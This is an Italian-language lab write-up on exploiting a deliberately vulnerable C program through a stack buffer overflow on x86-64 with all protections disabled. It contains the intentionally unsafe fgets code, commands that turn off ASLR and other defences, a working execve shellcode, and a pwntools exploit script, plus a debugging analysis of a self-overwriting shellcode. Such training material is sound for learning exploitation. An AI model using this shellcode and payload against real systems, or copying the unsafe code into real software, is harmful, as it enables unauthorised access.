# Buffer Overflow Lab — Shellcode Injection x86-64 - no protections

Lab completo di pwning su VM Ubuntu (QEMU/KVM, Q35 ICH9). Obiettivo: exploitare un classic stack buffer overflow iniettando shellcode direttamente nello stack.

---

## Ambiente

- OS: Ubuntu (VM QEMU/KVM, Q35 ICH9)
- Arch: x86-64
- Protezioni disabilitate: stack canary, NX, PIE, CET/IBT

---

## Il binario vulnerabile

```c
// simple-bo.c
#include <stdio.h>
#include <stdlib.h>

int vulnerable_function(){
    char buffer[0x10];
    printf("buffer @ %p\n", buffer);          // leak dell'indirizzo — fondamentale
    return (int)fgets(buffer, 0x1000, stdin); // overflow intenzionale
}

int main(){
    printf("Welecome to this very dangerous binary!\n");
    if (!vulnerable_function()){ printf("ohoh, something strange happened...\n"); return 1; }
    printf("everything went smoothly :/\n");
    return 0;
}
```

La vulnerabilità è in `fgets(buffer, 0x1000, stdin)`: alloca 16 byte ma accetta fino a 4096 byte di input, permettendo di sovrascrivere tutto quello che viene dopo il buffer nello stack frame.

### Compilazione

> [!important] Flag Obbligatori Ogni flag rimuove una protezione specifica. Omettere anche solo uno cambia il comportamento del binario in modo sottile.

```bash
gcc -fno-stack-protector \   # disabilita stack canary
    -no-pie \                # disabilita ASLR sul binario (indirizzi fissi)
    -z execstack \           # rende lo stack eseguibile
    -fcf-protection=none \   # disabilita CET/IBT (Intel Control-flow Enforcement)
    -o simple-bo-exec simple-bo.c
```

> [!warning] ASLR di sistema Anche con `-no-pie`, l'ASLR di sistema randomizza lo stack. Va disabilitato separatamente.
> 
> ```bash
> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
> 
> # Persistente tra i reboot:
> echo "kernel.randomize_va_space = 0" | sudo tee -a /etc/sysctl.conf
> sudo sysctl -p
> ```

### Verifica protezioni

```bash
checksec --file=simple-bo-exec
# Atteso:
# No canary | NX disabled | No PIE
```

```bash
readelf -n simple-bo-exec
# Non deve comparire IBT o SHSTK (CET)
# "x86 ISA needed: x86-64-baseline" è normale, non è CET
```

---

## Layout dello stack

Dentro `vulnerable_function`, dopo il prologo (`push rbp; mov rbp,rsp; sub rsp,0x10`):

```
indirizzo crescente ↓

0x7fffffffdd30  ┌──────────────────────┐ ← RSP = &buffer
                │   buffer  (16 byte)  │
0x7fffffffdd40  ├──────────────────────┤
                │  saved RBP  (8 byte) │
0x7fffffffdd48  ├──────────────────────┤
                │ return address(8 byte│ ← obiettivo della sovrascrittura
0x7fffffffdd50  └──────────────────────┘
```

> [!info] Offset al Return Address **24 byte** dall'inizio del buffer: 16 (buffer) + 8 (saved RBP). Confermabile con GDB: `info frame` dentro `vulnerable_function`.

---

## Shellcode

24 byte, null-free, x86-64 Linux. Esegue `execve("//bin/sh", NULL, NULL)` via syscall diretta.

```nasm
section .text
global _start
_start:
    xor  esi, esi                  ; RSI = 0  (2 byte, più corto di xor rsi,rsi)
    mul  esi                       ; RAX = 0, RDX = 0  (2 byte)
    push rsi                       ; push null terminator  (1 byte)
    mov  rsi, 0x68732f6e69622f2f   ; RSI = "//bin/sh"  (10 byte)
    push rsi                       ; push stringa  (1 byte)
    push rsp                       ; push puntatore alla stringa  (1 byte)
    pop  rdi                       ; RDI = &"//bin/sh"  (1 byte)
    xor  esi, esi                  ; RSI = NULL (argv)  (2 byte)
    mov  al, 59                    ; RAX = 59 (execve syscall)  (2 byte)
    syscall                        ; esegui  (2 byte)
    ; totale: 24 byte
```

**Byte string:**

```
\x31\xf6\xf7\xe6\x56\x48\xbe\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x54\x5f\x31\xf6\xb0\x3b\x0f\x05
```

```bash
# Verifica standalone (deve aprire una shell)
./shellcode
$ id
```

> [!tip] Trucchi di Compattezza
> 
> - `xor esi, esi` (2 byte) invece di `xor rsi, rsi` (3 byte): azzerare il registro a 32 bit azzera anche i 32 bit superiori in x86-64
> - `mul esi` (2 byte): moltiplica EAX × ESI = 0, azzera anche EDX — tre registri a zero in due istruzioni
> - `push rsp; pop rdi` (2 byte) invece di `mov rdi, rsp` (3 byte): risparmia 1 byte

---

## Il bug — shellcode che si autodistrugge

### Prima versione (rotta)

```python
# payload-constructor-old.py
shellcode = b"\x31\xf6..." # 24 byte
rsp_addr  = 0x7fffffffdd30  # inizio buffer

payload  = shellcode         # 24 byte: riempie buffer(16) + saved RBP(8)
payload += p64(rsp_addr)     # return address → inizio shellcode
```

**Risultato:** `Illegal instruction (core dumped)`

### Analisi del SIGILL

> [!bug] Root Cause Lo shellcode **si sovrascrive da solo** mentre gira. Ecco perché.

`ret` fa due cose in sequenza:

```
ret  ≡  pop rip   → legge [RSP] in RIP, poi RSP += 8
        jmp rip   → salta all'indirizzo letto
```

Quindi dopo il `ret`, la situazione è:

```
RIP = 0x7fffffffdd30   ← esecuzione parte qui (corretto)
RSP = 0x7fffffffdd50   ← RSP avanzato di +8 dopo il pop
```

Ora lo shellcode inizia a girare. Ogni `push` **decrementa RSP di 8** e scrive lì:

```
push rsi (null)         RSP: 0xdd50 → 0xdd48    scrive a 0xdd48  ✓ (era ret addr, ok)
push rsi ("//bin/sh")   RSP: 0xdd48 → 0xdd40    scrive a 0xdd40  ✗ PROBLEMA
```

`0x7fffffffdd40` è esattamente dove stanno i **byte finali dello shellcode** (offset 16-23):

```
0xdd40: 54  ← push rsp        ]
0xdd41: 5f  ← pop rdi         ]
0xdd42: 31  ← xor esi,esi     ] sovrascritta con "//bin/sh"
0xdd43: f6  ←                 ]    = 2f 2f 62 69 6e 2f 73 68
0xdd44: b0  ← mov al,59       ]
0xdd45: 3b  ←                 ]
0xdd46: 0f  ← syscall high    ]
0xdd47: 05  ← syscall low     ]
```

Dopo il `push rsi`, al posto di `push rsp` la CPU trova `0x2f` (`/`), opcode invalido in 64-bit → **SIGILL**.

> [!note] Standalone vs Injected Lo shellcode standalone funzionava perché girava nel segmento `.text` (read-only, separato dallo stack). I `push` scrivevano su uno stack lontano dal codice. Iniettato nel buffer invece **era lui stesso lo stack**, e i push tornavano indietro verso di lui.

---

## La fix — shellcode dopo il return address

### Schema della soluzione

Spostare lo shellcode **dopo** il return address nel payload, in modo che i `push` atterrino in memoria già "consumata" (sotto `0xdd50`), senza toccare il codice.

```
Layout vecchio (rotto):
[shellcode 24B][ret→0xdd30]         push sovrascrive coda dello shellcode

Layout nuovo (funziona):
[NOP×24][ret→0xdd50][shellcode]     push scrive sotto 0xdd50, shellcode intatto
```

### Mappa memoria con il nuovo payload

```
0x7fffffffdd30  [90 90 90 90 90 90 90 90]  ← buffer    ) padding
0x7fffffffdd38  [90 90 90 90 90 90 90 90]  ← buffer    )
0x7fffffffdd40  [90 90 90 90 90 90 90 90]  ← saved RBP ) padding
0x7fffffffdd48  [50 dd ff ff ff 7f 00 00]  ← return address → 0xdd50
0x7fffffffdd50  [shellcode 24 byte]        ← RIP arriva qui dopo ret
```

Dopo `ret`:

- **RIP = `0xdd50`** → esecuzione shellcode ✓
- **RSP = `0xdd50`** → i `push` scendono verso `0xdd48`, `0xdd40`... tutto sotto lo shellcode ✓

### Exploit finale

```python
# payload-constructor.py
from pwn import *
import sys

shellcode = b"\x31\xf6\xf7\xe6\x56\x48\xbe\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x56\x54\x5f\x31\xf6\xb0\x3b\x0f\x05"
buf_addr  = 0x7fffffffdd30

shellcode_addr = buf_addr + 32  # 0x7fffffffdd50

payload  = b'\x90' * 24         # padding: buffer(16) + saved RBP(8)
payload += p64(shellcode_addr)  # return address → shellcode
payload += shellcode            # shellcode a offset 32

sys.stdout.buffer.write(payload + b'\n')
```

### Verifica payload

```bash
python3 payload-constructor.py > payload.bin
xxd payload.bin

# Output atteso:
# 00000000: 9090 9090 9090 9090 9090 9090 9090 9090  ................
# 00000010: 9090 9090 9090 9090 50dd ffff ff7f 0000  ........P.......
# 00000020: 31f6 f7e6 5648 be2f 2f62 696e 2f73 6856  1...VH.//bin/shV
# 00000030: 545f 31f6 b03b 0f05 0a                   T_1..;...
```

### Esecuzione

```bash
# cat mantiene stdin aperto dopo il payload → la shell è interattiva
cat payload.bin - | ./simple-bo-exec

# Output:
# Welecome to this very dangerous binary!
# buffer @ 0x7fffffffdd30
# id
# uid=1000(user) gid=1000(user) groups=...
```

---

## Concetti chiave appresi

### `ret` fa due cose, non una

```
ret  ≡  pop rip    (RSP += 8, RIP = valore letto)
        jmp rip
```

Dopo il `ret`, **RIP** va all'indirizzo che avevi scritto, ma **RSP** è già avanzato di 8. Sono due registri distinti. Confonderli porta a bug sottili come quello di questo lab.

### Push cresce verso il basso

Su x86-64 lo stack cresce verso indirizzi più bassi:

```
push rX  →  RSP -= 8 ; [RSP] = rX
pop  rX  →  rX = [RSP] ; RSP += 8
```

Shellcode iniettato nello stack = codice che convive con i dati che sta manipolando. Ogni `push` può sovrascrivere il codice stesso se non si tiene conto di dove punta RSP.

### Indirizzi diversi per contesto

|Contesto|Indirizzo buffer|
|---|---|
|Dentro GDB|~`0xdcf0`|
|Esecuzione diretta|~`0xdd20`|
|Via pipe (`cat \| ./`)|~`0xdd30`|

GDB aggiunge variabili d'ambiente che shiftano lo stack. Misurare sempre l'indirizzo **nello stesso contesto** in cui si userà l'exploit.

### `printf` nel sorgente influenza il frame

Rimuovere o aggiungere `printf` nella funzione vulnerabile cambia il frame generato dal compilatore (~16 byte di differenza osservata). Compilare e misurare sempre con la **versione finale** del binario.

---

## Checklist

- [x] ASLR disabilitato — `cat /proc/sys/kernel/randomize_va_space` → `0`
- [x] Compilato con tutti i flag di disabilitazione protezioni
- [x] `readelf -n` non mostra IBT/SHSTK
- [x] Shellcode standalone funziona (`./shellcode` apre shell)
- [x] `rsp_addr` misurato **via pipe**, non dentro GDB
- [x] Shellcode posizionato **dopo** il return address nel payload
- [x] `xxd payload.bin` mostra i byte corretti
- [x] `cat payload.bin - | ./simple-bo-exec` → shell ottenuta ✓

---

## Prossimi step

- **ASLR on** — leak dell'indirizzo runtime + calcolo offset
- **NX on** — ret2libc (niente shellcode, si riusa codice già in memoria)
- **Stack canary** — bypass via leak o brute force